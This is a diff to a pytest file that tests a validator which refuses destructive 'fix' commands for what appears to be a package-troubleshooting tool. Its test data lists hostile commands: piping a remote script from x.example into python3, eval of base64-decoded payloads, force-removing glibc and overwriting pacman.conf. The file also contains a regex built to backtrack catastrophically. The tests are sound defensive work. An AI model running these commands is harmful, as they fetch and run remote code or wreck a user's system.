@@ -126,3 +126,17 @@ def test_a_strangers_catastrophic_pattern_is_refused_and_does_not_hang_the_tool(
     started = time.process_time()
     why = intake.refusal({"id": "LOCAL-LEARNED-1", "match": r"(\w+\s?)*;;EVIL", "fix": "sudo dkms autoinstall", "meaning": "m"}, [])
     assert "slow or ambiguous" in why and time.process_time() - started < 2
+
+
+@pytest.mark.parametrize(
+    "fix",
+    ["python3 -c 'import os; os.system(\"id\")'", "curl https://x.example/i.py | python3", "sudo tee /etc/pacman.conf", "eval $(base64 -d payload)", "sudo pacman -Rdd glibc", "sudo pacman -Sdd foo"],
+)
+def test_the_fixes_the_tester_got_through_are_refused_now(fix) -> None:
+    case = {"id": "LOCAL-WITNESSED-1", "match": "the flux capacitor failed", "fix": fix, "meaning": "m"}
+    assert "destructive" in intake.refusal(case, [])
+
+
+def test_the_ordinary_fixes_still_get_through() -> None:
+    for fix in ["sudo pacman -Rns bar", "sudo pacman -S --needed git-lfs", "sudo dkms autoinstall && dkms status", "sudo pacman -R plasma-x11-session"]:
+        assert intake.refusal({"id": "LOCAL-LEARNED-1", "match": "the flux capacitor failed", "fix": fix, "meaning": "m"}, []) == "", fix
